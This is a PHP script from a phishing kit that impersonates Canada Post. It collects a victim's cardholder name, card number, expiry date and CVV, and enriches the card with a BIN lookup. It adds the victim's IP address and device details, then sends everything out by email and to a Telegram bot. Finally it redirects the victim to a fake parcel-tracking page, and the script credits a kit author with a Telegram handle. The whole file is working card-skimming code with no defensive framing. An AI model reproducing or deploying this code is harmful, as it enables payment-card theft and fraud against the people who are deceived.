<?php

include "../config.php";
include "../assets/get.php";

$bincheck = $_POST['card_number'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);
$bin = $_POST['card_number'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['flag'] = $xBIN["country"]["emoji"];
$_SESSION['countryname'] = $xBIN["country"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);

$message .= "📮 ################ Canada Post ################📮\n";
$message .= "\n";
$message .= "Cardholder Name : ".$_POST['cardholder_name']."\n";
$message .= "Card Number : ".$_POST['card_number']."\n";
$message .= "Expires MM/YY : ".$_POST['expiry']."\n";
$message .= "Security Code : ".$_POST['cvv']."\n";
$message .= "\n";
$message .= "################# Card Details #################\n";
$message .= "\n";
$message .= "Bank : ".$_SESSION['bank_name']."\n";
$message .= "Type : ".$_SESSION['bank_type']."\n";
$message .= "Brand : ".$_SESSION['bank_brand']."\n";
$message .= "Country : ".$_SESSION['countryname']." | ".$_SESSION['flag']."\n";
$message .= "\n";
$message .= "################# IP #################\n";
$message .= "IP Address : https://www.whatismyip.com/ip/" . htmlspecialchars($_SERVER['REMOTE_ADDR']) . "\n";
$message .= "System : " . $os ."\n";
$message .= "Browser : " . $browser ."\n";
$message .= "Device Name : " . $deviceName ."\n";
$message .= "📮 ################# Canada Post #################📮\n";
$message .= "\n©️ Mr900 | Telegram @mr900com\n"; // Copyright in the message
$subject = "Card | Canada Post |";
$headers = 'From: Canada_Post' . "\r\n";

@mail($Email,$subject,$message,$headers);

@file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


	header('Location: ../address.php?action=track&tracknumbers=QQ767123987CA'); 
?>